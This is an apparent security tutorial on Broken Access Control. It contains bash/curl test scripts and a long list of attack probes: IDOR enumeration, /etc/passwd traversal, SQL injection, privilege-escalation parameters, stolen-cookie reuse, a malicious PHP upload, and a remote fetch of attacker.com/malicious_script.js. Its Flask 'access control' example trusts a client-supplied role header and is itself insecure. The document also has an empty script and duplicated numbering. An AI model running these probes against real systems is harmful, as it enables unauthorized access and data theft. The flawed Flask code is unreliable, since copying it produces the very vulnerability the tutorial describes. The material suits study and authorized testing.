#### Let's delve into the Broken Access Control vulnerability in detail.

### What is Broken Access Control?

Broken Access Control is a security vulnerability that occurs when an application fails to properly enforce restrictions on what authenticated users are allowed to do. In essence, it means that users can perform actions they should not be authorized to do, such as accessing unauthorized resources, modifying other users' data, or executing privileged actions without proper permission.

### How Does Broken Access Control Work?

Broken Access Control can manifest in various forms, including:

1. **Direct Object References**: This occurs when an attacker can access and manipulate resources directly by modifying parameters, such as URLs or form fields, to reference unauthorized objects.

2. **Insecure Direct Object References (IDOR)**: Similar to direct object references, the attacker can access objects by simply manipulating parameters without any authentication or authorization checks.

3. **Missing Function Level Access Control**: Here, the application lacks proper checks to ensure that users have the necessary permissions to access certain functions or features. Attackers can exploit this by directly calling privileged functions.

4. **Privilege Escalation**: In this scenario, attackers manipulate their privileges to gain unauthorized access to restricted resources or perform actions reserved for higher-privileged users.

### Examples of Broken Access Control

Let's illustrate these with examples:

1. **Direct Object Reference**:
   - An application stores user profile pictures in a directory accessible via URLs like `/images/profile/user123.jpg`. However, there's no authentication or authorization check, so any user can access any profile picture by guessing the URL.

2. **Insecure Direct Object References (IDOR)**:
   - A banking application allows users to view their account details by navigating to URLs like `/account?id=123`. An attacker, instead of providing their own ID, manipulates the parameter to access other users' accounts.

3. **Missing Function Level Access Control**:
   - An admin panel for managing users is accessible to regular users by simply navigating to `/admin_panel`. The application only hides the link from regular users but doesn't check if they have administrative privileges before executing admin actions.

4. **Privilege Escalation**:
   - A forum website allows users to post comments. An attacker discovers that by modifying the HTML source code of the comment form, they can elevate their privileges to that of an admin and perform administrative actions.

### Testing for Broken Access Control

To test for Broken Access Control, you can follow these steps:

1. **Identify Authorization Points**: Locate areas in the application where access control is enforced, such as authentication mechanisms, role-based access controls, or specific functions restricted to certain users.

2. **Attempt Unauthorized Access**: Try accessing resources or performing actions that should be restricted to certain users or roles. This includes attempting to access other users' data, accessing administrative functions as a regular user, or accessing privileged APIs without proper authorization.

3. **Review Source Code**: Analyze the application's source code, especially authorization logic, to identify any gaps or weaknesses in access control mechanisms.

### Bash Script to Test Broken Access Control

Here's a simple bash script to test for Broken Access Control using curl:

#### bash script 01:

```bash
#!/bin/bash

# Test for Direct Object Reference
curl http://example.com/images/profile/user123.jpg

# Test for Insecure Direct Object References
curl http://example.com/account?id=123

# Test for Missing Function Level Access Control
curl http://example.com/admin_panel

# Test for Privilege Escalation
# (Modify the HTML source of the comment form)
```
#### bash script 02:

```bash
#!/bin/bash

# Bash script to test for Broken Access Control vulnerability

# Change the URL and parameters as per your application
URL="https://example.com/user/profile?id=123"

# Send a request to the URL and check the response
response=$(curl -s -o /dev/null -w "%{http_code}" "$URL")

if [ $response -eq 200 ]; then
  echo "Access control is broken! HTTP Status Code: $response"
else
  echo "Access control is not broken. HTTP Status Code: $response"
fi

```
#### bash script 03:
```bash
#!/bin/bash

# Test for accessing sensitive admin endpoint without proper authentication
curl -i http://example.com/adminpanel -H "Cookie: session=regular_user_session_id"

# Test for accessing another user's data (IDOR)
curl -i http://example.com/user?id=123 -H "Cookie: session=regular_user_session_id"

```
#### bash script 04:
```bash
#!/bin/bash

USER_ID="123"  # Your own user ID
TARGET_URL="http://example.com/profile/"

# Loop through different user IDs
for ID in {1..100}; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}${ID}")
  if [ $RESPONSE -eq 200 ]; then
    echo "Potential IDOR Vulnerability found for user ID: $ID"
  fi
done


```

#### bash script 05:

```bash
#!/bin/bash

# Test unauthorized access to a restricted resource
curl -i http://example.com/admin/dashboard -X GET

# Test vertical privilege escalation
curl -i -X POST http://example.com/user/profile -d "role=admin&user_id=123"


```

#### bash script 06:

```bash
#!/bin/bash

# Replace the URL with the target application endpoint
TARGET_URL="http://example.com/files/"

# Directory traversal payload
TRAV_TRAVERSAL="../../../../../etc/passwd"

# Send request to the target URL with directory traversal payload
curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL$TRAV_TRAVERSAL"


```
#### bash script 07:

```bash


```
#### bash script 08:
```bash
#!/bin/bash

# Example script to test for Broken Access Control
# Replace <URL> with the target application URL

TARGET_URL="<URL>/restricted-resource"
COOKIE="session=your_session_cookie"

# Make a request to the restricted resource
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X GET $TARGET_URL -H "Cookie: $COOKIE")

if [ $RESPONSE -eq 200 ]; then
    echo "Access control is broken! Resource is accessible."
else
    echo "Access control is intact. Resource is not accessible."
fi
```
#### bash script 09:
```bash
#!/bin/bash

# Replace <URL> and <TOKEN> with actual endpoint and authentication token
URL="http://example.com/api/resource"
TOKEN="your_auth_token_here"

# Attempt to access resources without proper authorization
curl -H "Authorization: Bearer $TOKEN" $URL


```
#### bash script 09:
```bash
#!/bin/bash

# Script to test for Broken Access Control vulnerability by attempting to access restricted resources

# Usage: ./test_broken_access_control.sh <target_url>

TARGET_URL=$1

# Try accessing sensitive resources without proper authorization
echo "Trying to access restricted resources..."
curl -i $TARGET_URL/admin_panel          # Example: Attempt to access admin panel
curl -i $TARGET_URL/private_data         # Example: Attempt to access private data


```
#### bash script 10:
```bash
#!/bin/bash

# Bash script to test Broken Access Control vulnerability

# Replace the URL with the target application
TARGET_URL="http://example.com/profile?id="

# List of user IDs to test
USER_IDS=("1" "2" "3" "admin")

# Iterate through each user ID
for USER_ID in "${USER_IDS[@]}"; do
    # Make a request to the profile page with the user ID
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}${USER_ID}")

    # Check if the response code indicates successful access
    if [ "$RESPONSE" == "200" ]; then
        echo "User with ID $USER_ID: Access Granted"
    else
        echo "User with ID $USER_ID: Access Denied"
    fi
done


```
#### bash script 11:
```bash
#!/bin/bash

# Change the URL and parameters according to your application

URL="http://example.com/admin"
USER="attacker"
PASSWORD="password"

# Attempt to access the restricted resource

RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASSWORD" "$URL")

if [ "$RESPONSE" == "200" ]; then
    echo "Vulnerable: Access granted to restricted resource"
else
    echo "Not Vulnerable: Access denied to restricted resource"
fi


```
#### bash script 12:
```bash
#!/bin/bash

# Replace the following URL with the target endpoint you want to test
TARGET_URL="https://example.com/admin/delete-user"

# Replace the following with a valid authentication token or session cookie
AUTH_TOKEN="your-auth-token"

# Request the target endpoint with the authentication token
RESPONSE=$(curl -s -X POST -H "Authorization: Bearer $AUTH_TOKEN" $TARGET_URL)

# Check the response for indicators of successful access or error messages
if [[ $RESPONSE == *"Access Denied"* ]]; then
    echo "Access control is working properly"
else
    echo "Broken Access Control vulnerability found"
fi


```



###Code Example (Web Application):
```python
# Flask example implementing access control

from flask import Flask, request, abort

app = Flask(__name__)

# Define roles and permissions (in a real-world scenario, this would be more complex)
ROLES = {
    'user': ['read'],
    'admin': ['read', 'write']
}

@app.route('/resource', methods=['GET', 'POST'])
def resource():
    role = request.headers.get('X-Role')
    if not role:
        abort(401, 'Role header is missing')

    if role not in ROLES:
        abort(403, 'Invalid role')

    if request.method == 'GET' and 'read' not in ROLES[role]:
        abort(403, 'Unauthorized')

    if request.method == 'POST' and 'write' not in ROLES[role]:
        abort(403, 'Unauthorized')

    return 'Access granted'

if __name__ == '__main__':
    app.run(debug=True)


```


### Prevention of Broken Access Control

To prevent Broken Access Control vulnerabilities, consider the following measures:

1. **Implement Proper Authentication and Authorization**: Enforce strong authentication mechanisms and access controls to ensure that only authenticated users with the necessary permissions can access resources and perform actions.

2. **Use Role-Based Access Control (RBAC)**: Implement RBAC to define and enforce roles and permissions for different users, limiting their access to only what is necessary for their tasks.

3. **Implement Access Control Checks**: Ensure that all access control checks are performed on the server-side and cannot be bypassed or manipulated by clients.

4. **Least Privilege Principle**: Follow the principle of least privilege by granting users only the minimum permissions required to perform their tasks, reducing the potential impact of a successful attack.

5. **Regular Security Audits and Code Reviews**: Conduct regular security audits and code reviews to identify and address potential access control vulnerabilities in the application code.

6. **Use Frameworks and Libraries**: Utilize security-focused frameworks and libraries that provide built-in mechanisms for authentication and access control, reducing the risk of implementation errors.

### More ways to test with curl:
```bash
curl -i http://example.com/protected/resource
curl -X POST -i http://example.com/protected/resource
curl -i http://example.com/users/other_user/profile
curl -X POST -d "admin=true" http://example.com/user/profile/update
curl -i http://example.com/files/../../../../etc/passwd
curl -X POST -i http://example.com/protected/resource
curl -X POST -d "param1=value1&param2=value2" -i http://example.com/protected/resource
curl -H "Authorization: Bearer <token>" -i http://example.com/protected/resource
curl -iL http://example.com/protected/resource
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -i http://example.com/protected/resource
curl -b "sessionid=123456789" -c cookies.txt -i http://example.com/protected/resource
curl -x http://proxy.example.com:8080 -i http://example.com/protected/resource
curl -k -i https://example.com/protected/resource
curl -v -i http://example.com/protected/resource
curl -i -r 0-100 http://example.com/protected/resource
curl -i -H "If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT" http://example.com/protected/resource
curl --compressed -i http://example.com/protected/resource
curl -H "Host: attacker.com" -i http://example.com/protected/resource
curl --resolve example.com:80:127.0.0.1 -i http://example.com/protected/resource
curl -i http://example.com/protected/../unprotected/resource
curl -i http://example.com/protected/resource?user=admin
curl -H "X-Forwarded-For: attacker.com" -i http://example.com/protected/resource
curl -i http://example.com/protected/resource?page=1
curl -i http://example.com/protected/resource?page=2
curl -b "sessionid=attacker_session_id" -i http://example.com/protected/resource
curl -i http://example.com/protected/resource/../
curl -i http://example.com/api/users/3
curl -X POST -d "role=admin" -i http://example.com/api/user/modify
curl -X POST -d "order_id=123&status=shipped" -i http://example.com/api/order/update
curl -H "X-Original-URL: /protected/resource" -i http://example.com/protected/resource
curl -i http://example.com/protected/resource?user=admin&user=attacker
curl -H "Authorization: Bearer tampered_jwt_token" -i http://example.com/protected/resource
curl -X POST -d "amount=100&receiver=attacker" -i http://example.com/transfer_money
curl -b "stolen_session_cookie=attacker_session" -i http://example.com/protected/resource
curl -X POST -H "X-Requested-With: XMLHttpRequest" -d "action=delete&id=123" -i http://example.com/api/user/action
curl -i https://storage.googleapis.com/attacker_bucket/protected_file.txt
curl -X GET -i http://example.com/api/admin/users
curl -i http://example.com/protected/resource?path=/admin&path=/home
curl -H "Origin: http://evil.com" -i http://example.com/protected/resource
curl -O http://example.com/downloads/secret_file.zip
curl -X POST -d '{ "query": "{ user(id: 123) { name } }" }' -i http://example.com/graphql
curl -i -N -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" http://example.com/websocket
curl -X PUT -d "isAdmin=true" -i http://example.com/api/user/profile/update
curl -i http://example.com/page.html
curl -i http://subdomain.example.com/protected/resource
curl -X POST -H "Origin: http://evil.com" -d "action=delete&id=123" -i http://example.com/api/user/action
curl -i http://example.com/scripts/admin_panel.php
curl -i http://example.com/api/users?page=1
curl -i http://example.com/api/users?page=9999
curl -X POST -d "action=delete&id=123" -i http://example.com/mobile/api/user/action
curl -X POST -d '{"user_id": "123", "action": "delete"}' -i http://example.com/webhook
curl -X POST -d "username=admin' OR '1'='1" -i http://example.com/login
curl -i http://example.com/templates/admin_panel.html
curl -i http://example.com/remote_image.php?url=http://attacker.com/malicious_script.js
curl -i http://example.com/api/users?page=1
curl -i http://example.com/api/users?page=2
curl -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ=" -i http://example.com/admin/resource
curl -i http://example.com/rewritten/admin/resource
curl -b "sessionid=attacker_session" -i http://example.com/protected/resource
curl -i -X POST http://example.com/hidden/admin/resource
curl -i -H "Origin: http://attacker.com" http://example.com/api/resource
curl -i http://example.com/api/user/data.json
curl -X POST -d "action=delete&id=123" -i http://example.com/mobile/api/user/action
curl -i http://example.com/admin/resource.bak
curl -i http://example.com/page.shtml
curl -H "Authorization: Bearer attacker_jwt_token" -i http://example.com/protected/resource
curl -X OPTIONS -H "Origin: http://evil.com" -H "Access-Control-Request-Method: GET" -i http://example.com/api/resource
curl -i http://cdn.example.com/protected_resource
curl -i -H "Host: admin.example.com" http://example.com/protected_resource
curl -i http://example.com/protected/resource -H "X-Custom-Header: admin"
curl -F "file=@malicious_script.php" -i http://example.com/upload
curl -X POST -d "user_id=123&action=delete" -i http://example.com/api/v1/mobile/action
curl -i -b "session_id=123456789" http://example.com/protected/resource
curl -X OPTIONS -i http://example.com/protected/resource
curl -i http://example.com/protected/resource -H "Integrity: sha256-<hash>"
curl -i http://example.com/api/data -H "Accept: text/javascript"
curl -i http://example.com/protected/resource -H "Content-Security-Policy: frame-ancestors 'none'"
curl -i http://example.com/protected/resource -H "Referer: http://evil.com"
curl -i http://example.com/protected/resource?role=admin
curl -i http://example.com/protected/resource#admin-section
curl -i http://example.com/protected/resource -H "Cookie: role=admin"
curl -X POST -d "role=admin" -i http://example.com/protected/resource
curl -X POST -d "csrf_token=attacker_token" -i http://example.com/protected/resource
curl -i http://example.com/non-existent-page
curl -i http://example.com/protected-resource -H "Cache-Control: no-store"
curl -i http://example.com/protected-resource.old
curl -i http://example.com/protected/resource?admin=true
curl -i http://example.com/protected/resource -H "X-Role: admin"
curl -i http://example.com/error/404
curl -X POST -H "X-HTTP-Method-Override: PUT" -i http://example.com/protected/resource
curl -i http://example.com/protected/resource -H "User-Agent: admin_browser"
curl -X POST -H "Content-Type: application/json" -d '{"role": "admin"}' -i http://example.com/protected/resource
curl -i http://example.com/admin/resource?access_level=admin
curl -i "http://example.com/user/%252E%252E/admin"
curl -i "http://example.com/admin?role=%2E%2E%2Fadmin"
curl -i "http://example.com/user/%u202E%u202E/admin"
curl -i "http://example.com/protected/resource" -H "Cookie: role=%u202E%u202Eadmin"
curl -iL "http://example.com/redirect?url=http://evil.com"
curl -i -H "Cookie: session=<session_id>" -X GET http://example.com/protected/resource
curl -i -X PUT -H "Content-Type: application/json" -d '{"role": "admin"}' http://example.com/api/resource
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" http://example.com/websocket
curl -i -X POST -H "Content-Type: application/json" -d '{"query": "{ user(id: \"admin\") { name } }"}' http://example.com/graphql

```

## Corresponding Tools

- [**Bash**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_bash/broken_access_control.sh)
- [**Go**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_go/broken_access_control.go)
- [**Java**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_java/BrokenAccessControlTester.java)
- [**JavaScript**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_javascript/broken_access_control.js)
- [**Perl**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_perl/broken_access_control.pl)
- [**PHP**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_php/broken_access_tool.php)
- [**Python**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_python/broken_access_control.py)
- [**Ruby**](https://github.com/saidehossain/Hacking_Tools/blob/main/hacking_with_ruby/broken_access_control.rb)
